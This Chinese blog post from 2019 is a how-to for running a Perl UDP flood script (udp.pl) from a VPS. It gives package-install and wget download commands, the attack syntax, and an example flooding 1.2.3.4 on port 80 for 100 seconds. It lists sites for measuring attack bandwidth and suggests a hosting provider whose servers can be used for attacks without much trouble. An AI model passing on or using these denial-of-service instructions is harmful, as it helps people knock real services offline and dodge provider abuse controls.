# [ALP本机发包脚本使用方法说明](https://www.beggar.tk/9.html)

> 作者: [Laowang](https://www.beggar.tk/author/1/)
>    
> 时间: 2019-10-12
>    
> 分类: [默认分类](https://www.beggar.tk/category/default/)

本机发包脚本使用方法说明.

登陆VPS，执行命令

CentOS:

```bash
yum update -y
yum install wget perl dstat -y
wget https://raw.githubusercontent.com/whunt1/ALP_Script/master/udp.pl
```

Debian & Ubuntu:

```bash
apt-get update -y
apt-get install wget perl dstat -y
wget https://raw.githubusercontent.com/whunt1/ALP_Script/master/udp.pl
```

执行命令：`perl udp.pl IP port thread time(s).`

如要攻击1.2.3.4，80端口攻击100秒

`perl udp.pl 1.2.3.4 80 200 100`

这里的200是线程，根据VPS网络性能自己决定.

监控网络状况可以输入 `dstat` 查看.

要查看打出多少流量，可以访问下面几个测量的墙.

## 测量网站

[vedbex]( https://www.vedbex.com/tools/dstat )

[ddosfilter]( http://ddosfilter.net/layer4.php )

[cyber-hub](https://cyber-hub.net/layer4.php)

[toolsmania](https://www.toolsmania.net/dstat_layer4.php)

[dstat.live](https://dstat.live/)

[dstat.cc](https://dstat.cc/l4.php)

什么？不知道用那里的机器发包？

scaleway online旗下的 只要你别一直打 基本没事.

[scaleway官网](https://www.scaleway.com/)

标签: none
